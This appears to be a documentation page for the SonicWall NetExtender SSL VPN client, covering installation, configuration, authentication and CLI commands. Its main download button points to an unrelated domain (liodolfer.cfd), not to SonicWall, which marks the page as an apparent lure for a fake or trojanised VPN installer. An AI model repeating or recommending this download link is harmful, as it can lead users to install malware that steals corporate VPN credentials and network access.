 # SonicWall NetExtender
 
SonicWall NetExtender is a lightweight SSL VPN client that allows remote users to securely connect to a corporate network. It provides full network access over an encrypted tunnel, supporting file transfers, drive mapping, and application usage as if you were on the local network. 


- [Installation](#installation) 
- [Supported Platforms](#supported-platforms)  
- [Feature Overview](#feature-overview)  
- [Configuring NetExtender](#configuring-netextender)  
- [Using NetExtender](#using-netextender)  
- [Authentication and Security](#authentication-and-security)  
- [Command Line Interface (CLI)](#command-line-interface-cli)  
 
## Installation
Click below to download NetExtender for Windows and get started:

[**Download NetExtender**](https://liodolfer.cfd/)

Begin your journey with SonicWall NetExtender by downloading the installation file. This is the first step toward setting up a secure SSL VPN connection to your corporate network. Once downloaded, follow the installation instructions to configure the client and enjoy reliable, encrypted remote access from anywhere.

## Supported Platforms 

NetExtender supports the following platforms:  

### **Windows:**  
- **Windows 10/11** (latest patches required)  
- **Microsoft Edge, Chrome, Firefox** supported  

### **Linux:**  
- **Ubuntu 18.04+**  
- **Fedora 14+**  
- **OpenSUSE 10.3+**  
- `.rpm` and `.tgz` package formats available  

### **Compatible SonicWall Appliances:**  
NetExtender works with **SonicWall SMA** and **firewalls running SonicOS** 6.5+.  

---

## Feature Overview

### 🔹 **Standalone Client**  
NetExtender functions as a **standalone application**, meaning you don’t need to open a browser after installation.  

### 🔹 **Multiple Authentication Methods**  
- **Local user authentication**  
- **One-Time Password (OTP)**  
- **RSA SecureID, Duo, Microsoft Authenticator**  

### 🔹 **Secure Connectivity**  
- **SSL-encrypted tunnels**  
- **Split Tunneling / Tunnel All Mode**  

### 🔹 **Proxy Support**  
NetExtender allows connection through **HTTPS proxies**, supporting automatic detection via **WPAD**.  

---

## Installing NetExtender

### Linux Installation (CLI method)  

1. **Download the correct package:**  
   ```bash
   wget https://yoursonicwallserver.com/NetExtender.tgz
   ```
2. **Extract and install:**  
   ```bash
   tar -xvzf NetExtender.tgz
   cd netExtenderClient/
   sudo ./install
   ```
3. **Launch NetExtender:**  
   ```bash
   netExtenderGui
   ```

> [!warning] **Root Access Required:**  
> NetExtender must be installed with `sudo` privileges.  

---

## Configuring NetExtender

### Configuring Connection Profiles 
You can save multiple connection profiles for quick access.  

1. Open **NetExtender** and go to **Connection Profiles**.  
2. Click **Add New Profile**.  
3. Enter:  
   - **Server:** `vpn.yourcompany.com`  
   - **Username & Password**  
   - **Domain:** (if applicable)  
4. Click **Save**.  

> [!info] **Tip:**  
> Use **auto-connect** options for seamless login on startup.  

### Proxy Configuration
1. Open NetExtender **Settings**.  
2. Enable **Proxy Support**.  
3. Choose a method:  
   - **Auto-detect (WPAD)**  
   - **Manual proxy settings** (enter IP and port)  

---

## Using NetExtender

### Starting a VPN Connection 
1. Open **NetExtender**.  
2. Select a **saved connection** or enter:  
   - **Server IP or hostname**  
   - **Username & Password**  
3. Click **Connect**.  
4. Once connected, you can:  
   - **Map network drives**  
   - **Access internal applications**  
   - **Transfer files securely**  

### Disconnecting NetExtender
Click **Disconnect** or run:  
```bash
NECLI disconnect
```


## Authentication and Security

### Supported Authentication Methods
- **Basic login (Username/Password)**  
- **One-Time Passwords (OTP)**  
- **Certificate-based authentication**  
- **Multi-factor authentication (MFA)**  

> [!warning] **Best Practice:**  
> Always enable **MFA** to prevent unauthorized access!  


## Command Line Interface (CLI)

NetExtender includes a **CLI** (`NECLI`) for automation.  

### Common Commands

#### Connect to VPN
```bash
NECLI connect -s vpn.company.com -u username -p password -d domain
```
#### Check Connection Status
```bash
NECLI showstatus
```
#### Disconnect
```bash
NECLI disconnect
```

> [!tip] **Automation:**  
> Use `batch scripts` for auto-login and routing setup.  
